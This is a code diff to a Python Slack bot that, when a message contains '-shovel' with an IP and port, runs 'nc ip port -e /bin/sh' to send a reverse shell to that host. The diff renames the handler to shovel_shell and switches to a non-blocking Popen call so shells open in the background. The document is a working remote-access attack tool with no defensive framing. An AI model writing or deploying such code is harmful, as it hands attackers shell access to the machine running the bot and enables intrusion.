@@ -2,9 +2,10 @@ import os
 import ssl as ssl_lib
 from slack import RTMClient
 import subprocess
+import threading
 
 @RTMClient.run_on(event="message")
-def say_hello(**payload):
+def shovel_shell(**payload):
   data = payload['data']
   web_client = payload['web_client']
   if 'text' in data and '-shovel' in data['text']:
@@ -15,7 +16,7 @@ def say_hello(**payload):
         port = args[2]
         print("Shoveling a shell for @"+user+" to "+ip+":"+port+"!")
         try:
-            subprocess.run(["nc",ip,port,"-e","/bin/sh"])
+            subprocess.Popen(["nc",ip,port,"-e","/bin/sh"])
         except:
             print("Error processing request for "+ip+":"+port+"!")
 
